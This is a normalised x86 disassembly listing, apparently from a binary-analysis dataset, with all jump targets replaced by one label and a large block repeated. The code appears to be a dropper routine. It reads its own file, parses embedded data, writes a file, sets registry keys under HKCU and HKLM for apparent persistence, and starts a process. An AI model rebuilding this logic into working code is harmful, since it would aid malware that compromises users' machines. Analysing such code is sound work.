mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_449160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_448f70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_448f70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_448f70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_448f70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_448f70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_448f70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xfb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_4490a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xfb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_44827d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_448f70
add esp 0x4
call sub_449130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_449160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_449160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_448f70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_448f70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_448f70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_448f70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
